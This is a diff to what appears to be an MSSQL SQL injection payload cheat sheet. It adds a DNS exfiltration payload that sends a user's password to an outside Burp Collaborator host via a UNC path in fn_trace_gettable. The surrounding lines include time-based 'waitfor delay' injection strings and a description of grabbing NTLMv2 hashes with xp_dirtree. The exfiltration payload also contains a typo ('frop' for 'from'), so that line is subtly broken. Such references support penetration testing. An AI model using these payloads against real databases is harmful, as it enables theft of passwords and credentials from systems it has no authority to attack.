@@ -15,7 +15,9 @@
 * [MSSQL Time Based](#mssql-time-based)
 * [MSSQL Stacked query](#mssql-stacked-query)
 * [MSSQL Command execution](#mssql-command-execution)
-* [MSSQL UNC path](#mssql-unc-path)
+* [MSSQL Out of band](#mssql-out-of-band)
+    * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
+    * [MSSQL UNC path](#mssql-unc-path)
 * [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
 * [MSSQL Trusted Links](#mssql-trusted-links)
 
@@ -134,7 +136,7 @@ ProductID=1';waitfor delay '0:0:10'--
 ProductID=1');waitfor delay '0:0:10'--
 ProductID=1));waitfor delay '0:0:10'--
 
-IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
+IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --
 ```
 
 ## MSSQL Stacked Query
@@ -187,8 +189,18 @@ print(sys.version)
 GO
 ```
 
+## MSSQL Out of band
 
-## MSSQL UNC Path
+### MSSQL DNS exfiltration
+
+Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1
+
+```powershell
+1 and exists(select * from fn_trace_gettable('\\'%2b(select pass frop users where id=1)%2b'.xxxxxxx.burpcollaborator.net\1.trc',default))
+```
+
+
+### MSSQL UNC Path
 
 MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
 
